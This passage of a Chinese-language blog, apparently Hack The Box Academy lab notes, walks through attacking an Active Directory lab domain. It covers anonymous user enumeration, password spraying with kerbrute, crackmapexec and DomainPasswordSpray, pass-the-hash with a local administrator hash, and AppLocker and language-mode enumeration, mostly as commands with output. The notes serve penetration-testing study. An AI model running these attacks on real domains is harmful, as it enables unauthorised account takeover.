class="hljs-title">Lockout</span> <span class="hljs-title">observation</span> <span class="hljs-title">window</span> (<span class="hljs-title">minutes</span>):                 30</span><br><span class="hljs-function"><span class="hljs-title">Computer</span> <span class="hljs-title">role</span>:                                        <span class="hljs-title">SERVER</span></span><br><span class="hljs-function"><span class="hljs-title">The</span> <span class="hljs-title">command</span> <span class="hljs-title">completed</span> <span class="hljs-title">successfully</span>.</span><br></code></pre></td></tr></table></figure>

<p><strong>PowerView</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">import-module</span> .\PowerView.ps1<br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainPolicy</span><br><br>Unicode        : <span class="hljs-selector-tag">@</span>&#123;Unicode=yes&#125;<br>SystemAccess   : <span class="hljs-selector-tag">@</span>&#123;MinimumPasswordAge=<span class="hljs-number">1</span>; MaximumPasswordAge=<span class="hljs-literal">-1</span>; MinimumPasswordLength=<span class="hljs-number">8</span>; PasswordComplexity=<span class="hljs-number">1</span>;<br>                 PasswordHistorySize=<span class="hljs-number">24</span>; LockoutBadCount=<span class="hljs-number">5</span>; ResetLockoutCount=<span class="hljs-number">30</span>; LockoutDuration=<span class="hljs-number">30</span>;<br>                 RequireLogonToChangePassword=<span class="hljs-number">0</span>; ForceLogoffWhenHourExpire=<span class="hljs-number">0</span>; ClearTextPassword=<span class="hljs-number">0</span>;<br>                 LSAAnonymousNameLookup=<span class="hljs-number">0</span>&#125;<br>KerberosPolicy : <span class="hljs-selector-tag">@</span>&#123;MaxTicketAge=<span class="hljs-number">10</span>; MaxRenewAge=<span class="hljs-number">7</span>; MaxServiceAge=<span class="hljs-number">600</span>; MaxClockSkew=<span class="hljs-number">5</span>; TicketValidateClient=<span class="hljs-number">1</span>&#125;<br>Version        : <span class="hljs-selector-tag">@</span>&#123;signature=<span class="hljs-string">&quot;<span class="hljs-variable">$CHICAGO</span><span class="hljs-variable">$</span>&quot;</span>; Revision=<span class="hljs-number">1</span>&#125;<br>RegistryValues : <span class="hljs-selector-tag">@</span>&#123;MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]&#125;<br>Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\&#123;<span class="hljs-number">31</span>B2F340<span class="hljs-literal">-016D-11D2-945F-00C04FB984F9</span>&#125;\MACHI<br>                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf<br>GPOName        : &#123;<span class="hljs-number">31</span>B2F340<span class="hljs-literal">-016D-11D2-945F-00C04FB984F9</span>&#125;<br>GPODisplayName : Default Domain Policy<br></code></pre></td></tr></table></figure>

<h2 id="4-获取用户名列表"><a href="#4-获取用户名列表" class="headerlink" title="4. 获取用户名列表"></a>4. 获取用户名列表</h2><h3 id="SMB-NULL-1"><a href="#SMB-NULL-1" class="headerlink" title="SMB NULL"></a>SMB NULL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">C47Sh4rk@htb[/htb]$ enum4linux -U 172.16.5.5  | grep <span class="hljs-string">&quot;user:&quot;</span> | <span class="hljs-built_in">cut</span> -f2 -d<span class="hljs-string">&quot;[&quot;</span> | <span class="hljs-built_in">cut</span> -f1 -d<span class="hljs-string">&quot;]&quot;</span><br><br>administrator<br>guest<br>krbtgt<br>lab_adm<br>htb-student<br>avazquez<br>pfalcon<br>fanthony<br>wdillard<br>lbradford<br>sgage<br>asanchez<br>dbranch<br>ccruz<br>njohnson<br>mholliday<br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">C47Sh4rk@htb[/htb]$ rpcclient -U <span class="hljs-string">&quot;&quot;</span> -N 172.16.5.5<br><br>rpcclient $&gt; enumdomusers <br>user:[administrator] rid:[0x1f4]<br>user:[guest] rid:[0x1f5]<br>user:[krbtgt] rid:[0x1f6]<br>user:[lab_adm] rid:[0x3e9]<br>user:[htb-student] rid:[0x457]<br>user:[avazquez] rid:[0x458]<br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">C47Sh4rk@htb[/htb]$ crackmapexec smb 172.16.5.5 --<span class="hljs-built_in">users</span><br><br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-01-10 13:23:09.463228<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-02-22 14:48:26.653366<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 0 baddpwdtime: 2022-02-17 22:59:22.684613<br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<h3 id="LDAP-Anonymous"><a href="#LDAP-Anonymous" class="headerlink" title="LDAP Anonymous"></a>LDAP Anonymous</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">C47Sh4rk@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b <span class="hljs-string">&quot;DC=INLANEFREIGHT,DC=LOCAL&quot;</span> -s sub <span class="hljs-string">&quot;(&amp;(objectclass=user))&quot;</span>  | grep sAMAccountName: | <span class="hljs-built_in">cut</span> -f2 -d<span class="hljs-string">&quot; &quot;</span><br><br>guest<br>ACADEMY-EA-DC01$<br>ACADEMY-EA-MS01$<br>ACADEMY-EA-WEB01$<br>htb-student<br>avazquez<br>pfalcon<br>fanthony<br>wdillard<br>lbradford<br>sgage<br>asanchez<br>dbranch<br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">C47Sh4rk@htb[/htb]$ ./windapsearch.py --dc-ip 172.16.5.5 -u <span class="hljs-string">&quot;&quot;</span> -U<br><br>[+] No username provided. Will try anonymous <span class="hljs-built_in">bind</span>.<br>[+] Using Domain Controller at: 172.16.5.5<br>[+] Getting defaultNamingContext from Root DSE<br>[+]	Found: DC=INLANEFREIGHT,DC=LOCAL<br>[+] Attempting <span class="hljs-built_in">bind</span><br>[+]	...success! Binded as: <br>[+]	 None<br><br>[+] Enumerating all AD <span class="hljs-built_in">users</span><br>[+]	Found 2906 <span class="hljs-built_in">users</span>: <br><br>cn: Guest<br><br>cn: Htb Student<br>userPrincipalName: htb-student@inlanefreight.local<br><br>cn: Annie Vazquez<br>userPrincipalName: avazquez@inlanefreight.local<br><br>cn: Paul Falcon<br>userPrincipalName: pfalcon@inlanefreight.local<br><br>cn: Fae Anthony<br>userPrincipalName: fanthony@inlanefreight.local<br><br>cn: Walter Dillard<br>userPrincipalName: wdillard@inlanefreight.local<br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<h3 id="Kerbrute-通过Kerberos-Pre-Authentication"><a href="#Kerbrute-通过Kerberos-Pre-Authentication" class="headerlink" title="Kerbrute(通过Kerberos Pre-Authentication)"></a>Kerbrute(通过Kerberos Pre-Authentication)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">C47Sh4rk@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt<br><br>    __             __               __     <br>   / /_____  _____/ /_  _______  __/ /____ <br>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \<br> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/<br>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        <br><br>Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop<br><br>2022/02/17 22:16:11 &gt;  Using KDC(s):<br>2022/02/17 22:16:11 &gt;  	172.16.5.5:88<br><br>2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:	 jjones@inlanefreight.local<br>2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:	 sbrown@inlanefreight.local<br>2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:	 tjohnson@inlanefreight.local<br>2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:	 jwilson@inlanefreight.local<br>2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:	 bdavis@inlanefreight.local<br>2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:	 njohnson@inlanefreight.local<br>2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:	 asanchez@inlanefreight.local<br>2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:	 dlewis@inlanefreight.local<br>2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:	 ccruz@inlanefreight.local<br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<h2 id="5-密码喷洒"><a href="#5-密码喷洒" class="headerlink" title="5. 密码喷洒"></a>5. 密码喷洒</h2><p><strong>bash脚本</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">C47Sh4rk@htb[/htb]$ <span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">cat</span> valid_users.txt);<span class="hljs-keyword">do</span> rpcclient -U <span class="hljs-string">&quot;<span class="hljs-variable">$u</span>%Welcome1&quot;</span> -c <span class="hljs-string">&quot;getusername;quit&quot;</span> 172.16.5.5 | grep Authority; <span class="hljs-keyword">done</span><br><br>Account Name: tjohnson, Authority Name: INLANEFREIGHT<br>Account Name: sgage, Authority Name: INLANEFREIGHT<br></code></pre></td></tr></table></figure>

<p><strong>kerbrute</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">C47Sh4rk@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1<br><br>    __             __               __     <br>   / /_____  _____/ /_  _______  __/ /____ <br>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \<br> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/<br>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        <br><br>Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop<br><br>2022/02/17 22:57:12 &gt;  Using KDC(s):<br>2022/02/17 22:57:12 &gt;  	172.16.5.5:88<br><br>2022/02/17 22:57:12 &gt;  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1<br>2022/02/17 22:57:12 &gt;  Done! Tested 57 logins (1 successes) <span class="hljs-keyword">in</span> 0.172 seconds<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">C47Sh4rk@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +<br><br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">C47Sh4rk@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123<br><br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">C47Sh4rk@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +<br><br>SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)<br>SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)<br>SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)<br></code></pre></td></tr></table></figure>

<p><strong>windows域内环境</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Import-Module</span> .\DomainPasswordSpray.ps1<br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Invoke-DomainPasswordSpray</span> <span class="hljs-literal">-Password</span> Welcome1 <span class="hljs-literal">-OutFile</span> spray_success <span class="hljs-literal">-ErrorAction</span> SilentlyContinue<br><br>[*] Current domain is compatible with Fine<span class="hljs-literal">-Grained</span> Password Policy.<br>[*] Now creating a list of users to spray...<br>[*] The smallest lockout threshold discovered <span class="hljs-keyword">in</span> the domain is <span class="hljs-number">5</span> login attempts.<br>[*] Removing disabled users from list.<br>[*] There are <span class="hljs-number">2923</span> total users found.<br>[*] Removing users within <span class="hljs-number">1</span> attempt of locking out from list.<br>[*] Created a userlist containing <span class="hljs-number">2923</span> users gathered from the current user<span class="hljs-string">&#x27;s domain</span><br><span class="hljs-string">[*] The domain password policy observation window is set to  minutes.</span><br><span class="hljs-string">[*] Setting a  minute wait in between sprays.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Confirm Password Spray</span><br><span class="hljs-string">Are you sure you want to perform a password spray against 2923 accounts?</span><br><span class="hljs-string">[Y] Yes  [N] No  [?] Help (default is &quot;Y&quot;): Y</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] Password spraying has begun with  1  passwords</span><br><span class="hljs-string">[*] This might take a while depending on the total number of users</span><br><span class="hljs-string">[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM</span><br><span class="hljs-string">[*] Writing successes to spray_success</span><br><span class="hljs-string">[*] SUCCESS! User:sgage Password:Welcome1</span><br><span class="hljs-string">[*] SUCCESS! User:tjohnson Password:Welcome1</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] Password spraying is complete</span><br><span class="hljs-string">[*] Any passwords that were successfully sprayed have been output to spray_success</span><br></code></pre></td></tr></table></figure>



<h1 id="AD-获取初始权限后的枚举"><a href="#AD-获取初始权限后的枚举" class="headerlink" title="AD 获取初始权限后的枚举"></a>AD 获取初始权限后的枚举</h1><h2 id="1-枚举安全控制"><a href="#1-枚举安全控制" class="headerlink" title="1. 枚举安全控制"></a>1. 枚举安全控制</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-AppLockerPolicy</span> <span class="hljs-literal">-Effective</span> | <span class="hljs-built_in">select</span> <span class="hljs-literal">-ExpandProperty</span> RuleCollections<br><br>PathConditions      : &#123;%SYSTEM32%\WINDOWSPOWERSHELL\V1.<span class="hljs-number">0</span>\POWERSHELL.EXE&#125;<br>PathExceptions      : &#123;&#125;<br>PublisherExceptions : &#123;&#125;<br>HashExceptions      : &#123;&#125;<br>Id                  : <span class="hljs-number">3</span>d57af4a<span class="hljs-literal">-6cf8-4e5b-acfc-c2c2956061fa</span><br>Name                : Block PowerShell<br>Description         : Blocks Domain Users from <span class="hljs-keyword">using</span> PowerShell on workstations<br>UserOrGroupSid      : S<span class="hljs-literal">-1-5-21-2974783224-3764228556-2640795941-513</span><br>Action              : Deny<br><br>PathConditions      : &#123;%PROGRAMFILES%\*&#125;<br>PathExceptions      : &#123;&#125;<br>PublisherExceptions : &#123;&#125;<br>HashExceptions      : &#123;&#125;<br>Id                  : <span class="hljs-number">921</span>cc481<span class="hljs-literal">-6e17-4653-8f75-050b80acca20</span><br>Name                : (Default Rule) All files located <span class="hljs-keyword">in</span> the Program Files folder<br>Description         : Allows members of the Everyone <span class="hljs-built_in">group</span> to run applications that are located <span class="hljs-keyword">in</span> the Program Files folder.<br>UserOrGroupSid      : S<span class="hljs-literal">-1-1-0</span><br>Action              : Allow<br><br>PathConditions      : &#123;%WINDIR%\*&#125;<br>PathExceptions      : &#123;&#125;<br>PublisherExceptions : &#123;&#125;<br>HashExceptions      : &#123;&#125;<br>Id                  : a61c8b2c<span class="hljs-literal">-a319-4cd0-9690-d2177cad7b51</span><br>Name                : (Default Rule) All files located <span class="hljs-keyword">in</span> the Windows folder<br>Description         : Allows members of the Everyone <span class="hljs-built_in">group</span> to run applications that are located <span class="hljs-keyword">in</span> the Windows folder.<br>UserOrGroupSid      : S<span class="hljs-literal">-1-1-0</span><br>Action              : Allow<br><br>PathConditions      : &#123;*&#125;<br>PathExceptions      : &#123;&#125;<br>PublisherExceptions : &#123;&#125;<br>HashExceptions      : &#123;&#125;<br>Id                  : fd686d83<span class="hljs-literal">-a829-4351-8ff4-27c7de5755d2</span><br>Name                : (Default Rule) All files<br>Description         : Allows members of the local Administrators <span class="hljs-built_in">group</span> to run all applications.<br>UserOrGroupSid      : S<span class="hljs-literal">-1-5-32-544</span><br>Action              : Allow<br></code></pre></td></tr></table></figure>

<h2 id="2-枚举AppLocker策略"><a href="#2-枚举AppLocker策略" class="headerlink" title="2. 枚举AppLocker策略"></a>2. 枚举AppLocker策略</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-AppLockerPolicy</span> <span class="hljs-literal">-Effective</span> | <span class="hljs-built_in">select</span> <span class="hljs-literal">-ExpandProperty</span> RuleCollections<br><br>PathConditions      : &#123;%SYSTEM32%\WINDOWSPOWERSHELL\V1.<span class="hljs-number">0</span>\POWERSHELL.EXE&#125;<br>PathExceptions      : &#123;&#125;<br>PublisherExceptions : &#123;&#125;<br>HashExceptions      : &#123;&#125;<br>Id                  : <span class="hljs-number">3</span>d57af4a<span class="hljs-literal">-6cf8-4e5b-acfc-c2c2956061fa</span><br>Name                : Block PowerShell<br>Description         : Blocks Domain Users from <span class="hljs-keyword">using</span> PowerShell on workstations<br>UserOrGroupSid      : S<span class="hljs-literal">-1-5-21-2974783224-3764228556-2640795941-513</span><br>Action              : Deny<br><br>PathConditions      : &#123;%PROGRAMFILES%\*&#125;<br>PathExceptions      : &#123;&#125;<br>PublisherExceptions : &#123;&#125;<br>HashExceptions      : &#123;&#125;<br>Id                  : <span class="hljs-number">921</span>cc481<span class="hljs-literal">-6e17-4653-8f75-050b80acca20</span><br>Name                : (Default Rule) All files located <span class="hljs-keyword">in</span> the Program Files folder<br>Description         : Allows members of the Everyone <span class="hljs-built_in">group</span> to run applications that are located <span class="hljs-keyword">in</span> the Program Files folder.<br>UserOrGroupSid      : S<span class="hljs-literal">-1-1-0</span><br>Action              : Allow<br><br>PathConditions      : &#123;%WINDIR%\*&#125;<br>PathExceptions      : &#123;&#125;<br>PublisherExceptions : &#123;&#125;<br>HashExceptions      : &#123;&#125;<br>Id                  : a61c8b2c<span class="hljs-literal">-a319-4cd0-9690-d2177cad7b51</span><br>Name                : (Default Rule) All files located <span class="hljs-keyword">in</span> the Windows folder<br>Description         : Allows members of the Everyone <span class="hljs-built_in">group</span> to run applications that are located <span class="hljs-keyword">in</span> the Windows folder.<br>UserOrGroupSid      : S<span class="hljs-literal">-1-1-0</span><br>Action              : Allow<br><br>PathConditions      : &#123;*&#125;<br>PathExceptions      : &#123;&#125;<br>PublisherExceptions : &#123;&#125;<br>HashExceptions      : &#123;&#125;<br>Id                  : fd686d83<span class="hljs-literal">-a829-4351-8ff4-27c7de5755d2</span><br>Name                : (Default Rule) All files<br>Description         : Allows members of the local Administrators <span class="hljs-built_in">group</span> to run all applications.<br>UserOrGroupSid      : S<span class="hljs-literal">-1-5-32-544</span><br>Action              : Allow<br></code></pre></td></tr></table></figure>

<h3 id="解析-Get-AppLockerPolicy-Effective-结果"><a href="#解析-Get-AppLockerPolicy-Effective-结果" class="headerlink" title="解析 Get-AppLockerPolicy -Effective 结果"></a><strong>解析 <code>Get-AppLockerPolicy -Effective</code> 结果</strong></h3><p>你的命令 <code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</code> <strong>用于查看当前 Windows 设备上生效的 AppLocker 策略</strong>。AppLocker 是 Windows 用于控制应用程序执行的安全策略，常用于限制<strong>恶意软件执行</strong>或<strong>防止用户运行未经授权的软件</strong>。</p>
<p><strong>解析 AppLocker 规则</strong></p>
<p>你的输出显示了几条重要的规则：</p>
<table>
<thead>
<tr>
<th>规则名称</th>
<th>受影响路径</th>
<th>影响的用户&#x2F;组</th>
<th>操作</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Block PowerShell</strong></td>
<td><code>%SYSTEM32%\WINDOWSPOWERSHELL\V1.0\POWERSHELL.EXE</code></td>
<td><code>S-1-5-21-2974783224-3764228556-2640795941-513</code> (Domain Users)</td>
<td><strong>Deny（阻止）</strong></td>
</tr>
<tr>
<td><strong>(Default Rule) All files located in Program Files</strong></td>
<td><code>%PROGRAMFILES%\*</code></td>
<td><code>S-1-1-0</code> (Everyone)</td>
<td><strong>Allow（允许）</strong></td>
</tr>
<tr>
<td><strong>(Default Rule) All files located in Windows folder</strong></td>
<td><code>%WINDIR%\*</code></td>
<td><code>S-1-1-0</code> (Everyone)</td>
<td><strong>Allow（允许）</strong></td>
</tr>
<tr>
<td><strong>(Default Rule) All files</strong></td>
<td><code>*</code></td>
<td><code>S-1-5-32-544</code> (Administrators)</td>
<td><strong>Allow（允许）</strong></td>
</tr>
</tbody></table>
<h2 id="3-枚举语言模式"><a href="#3-枚举语言模式" class="headerlink" title="3. 枚举语言模式"></a>3. 枚举语言模式</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-variable">$ExecutionContext</span>.SessionState.LanguageMode<br><br>ConstrainedLanguage<br></code></pre></td></tr></table></figure>

